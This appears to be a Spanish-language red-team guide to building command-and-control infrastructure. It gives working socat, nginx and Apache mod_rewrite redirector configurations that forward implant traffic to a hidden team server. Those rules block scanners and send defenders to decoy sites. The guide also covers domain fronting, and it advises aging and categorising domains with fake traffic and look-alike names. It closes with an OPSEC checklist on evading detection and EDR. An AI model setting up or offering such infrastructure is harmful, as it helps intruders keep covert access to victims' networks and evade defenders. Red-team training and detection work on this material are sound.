# Infraestructura C2 — Redirectores y OPSEC

La infraestructura de C2 no es solo el servidor y el implante — es toda la cadena de comunicación entre ellos. En operaciones reales, exponer el Team Server directamente es un error crítico: si el tráfico es detectado, el defensor puede bloquear el IP del servidor y cortar toda la operación. Una infraestructura bien diseñada usa redirectores, dominios preparados y separación de roles para proteger el backend.

### Modelo de infraestructura básica

```
Target → [Redirector] → [Team Server]
            ↑
       (IP quemable)   (IP oculta)
```

El redirector recibe el tráfico del implante y lo reenvía al Team Server real. Si el redirector es detectado y bloqueado, se levanta otro sin perder acceso al Team Server ni a las sesiones activas.

### Redirectores con socat

La opción más simple para redirigir tráfico TCP:

```bash
# Redirigir puerto 80 al teamserver
socat TCP4-LISTEN:80,fork TCP4:teamserver-ip:80

# HTTPS
socat TCP4-LISTEN:443,fork TCP4:teamserver-ip:443

# Ejecutar como servicio en background
nohup socat TCP4-LISTEN:443,fork TCP4:10.10.10.1:443 &
```

### Redirectores con nginx

Nginx permite filtrar el tráfico antes de redirigirlo — solo el tráfico con el User-Agent o URI correctos llega al Team Server, el resto recibe una respuesta legítima:

```nginx
server {
    listen 443 ssl;
    server_name empresa-legitima.com;

    ssl_certificate /etc/letsencrypt/live/empresa-legitima.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/empresa-legitima.com/privkey.pem;

    # Tráfico C2 — URI específica del Malleable C2 profile
    location /jquery-3.3.1.min.js {
        proxy_pass https://teamserver-real:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
    }

    # El resto del tráfico — respuesta legítima para confundir al defensor
    location / {
        return 301 https://www.google.com$request_uri;
    }
}
```

### Redirectores con Apache mod\_rewrite

Apache con mod\_rewrite permite reglas más granulares basadas en User-Agent, URI, IP origen, etc.:

```apache
RewriteEngine On

# Solo redirigir si el User-Agent coincide con el del implante
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10.0; Win64; x64\)" [NC]
RewriteRule ^/jquery-3\.3\.1\.min\.js$ https://teamserver:443%{REQUEST_URI} [P,L]

# Bloquear scanners comunes
RewriteCond %{HTTP_USER_AGENT} "(nmap|masscan|zgrab|shodan)" [NC]
RewriteRule .* - [F,L]

# El resto — respuesta genérica
RewriteRule .* https://www.microsoft.com/ [R=301,L]
```

### Domain Fronting

El domain fronting usa CDNs (Cloudflare, AWS CloudFront, Azure CDN) para ocultar el destino real del tráfico C2. El Host header del TLS apunta a un dominio legítimo de la CDN, pero el Header HTTP interno redirige al servidor C2. Dificulta enormemente el bloqueo porque bloquear el IP de la CDN bloquearía todos sus clientes legítimos.

```
Target → HTTPS a cdn-legitima.com → CDN → Team Server real
         (SNI: cdn-legitima.com)
         (Host header: c2.attacker.com)
```

> Las principales CDNs (Cloudflare, AWS) han tomado medidas para prevenir domain fronting en sus plataformas. Sigue siendo viable en algunas CDNs y en entornos específicos, pero requiere investigación previa sobre qué CDN lo permite.

### Preparación de dominios (Domain Aging)

Un dominio recién registrado es sospechoso por definición. Los sistemas de reputación como Cisco Talos, BlueCoat y Palo Alto URL Filtering marcan dominios nuevos como "newly registered" y los bloquean en muchos entornos corporativos.

```bash
# Buenas prácticas para dominios C2:
# 1. Registrar el dominio con al menos 30-60 días de antelación
# 2. Generar tráfico legítimo hacia él (crawlers, visitas falsas)
# 3. Crear registros DNS completos: A, MX, SPF, DMARC
# 4. Usar dominios que imiten servicios legítimos (cdn-updates.com, telemetry-svc.net)
# 5. Comprobar reputación antes del engagement
curl "https://talosintelligence.com/reputation_center/lookup?search=dominio.com"
```

### Categorización de dominios

Muchos proxies web corporativos bloquean por categoría de dominio. Comprar dominios con categoría preexistente (tecnología, software, negocios) es más efectivo que registrar dominios nuevos:

```bash
# Herramientas para comprobar categoría
# Bluecoat/Symantec: sitereview.symantec.com
# Fortiguard: fortiguard.com/webfilter
# Palo Alto: urlfiltering.paloaltonetworks.com
# Cisco Talos: talosintelligence.com
```

### Separación de infraestructura por función

En operaciones grandes se separa la infraestructura por función para que comprometer un componente no exponga los demás:

```
Phishing     → dominio-phishing.com  → servidor de phishing
C2 corto     → cdn-updates.net       → redirector-1 → teamserver
C2 largo     → telemetry-svc.com     → redirector-2 → teamserver
Exfiltración → backup-sync.net       → servidor exfil
```

### Checklist de OPSEC

* \[ ] Team Server nunca expuesto directamente a internet
* \[ ] Redirector en VPS separado del Team Server
* \[ ] Certificado TLS legítimo (Let's Encrypt) en el redirector
* \[ ] Dominio con al menos 30 días de antigüedad
* \[ ] Categoría de dominio verificada en múltiples sistemas de reputación
* \[ ] Malleable C2 profile validado y personalizado (no usar perfiles públicos sin modificar)
* \[ ] Logs del redirector monitorizados para detectar análisis por parte del blue team
* \[ ] Plan de contingencia si el redirector es quemado

> La detección de C2 moderno raramente viene de firmas de red — viene de comportamiento del endpoint. Un implante bien configurado con sleep/jitter alto, indirect syscalls y traffic que imita tráfico legítimo puede mantenerse indetectado durante semanas incluso con EDR activo. La OPSEC de red es el segundo frente de defensa, no el primero.
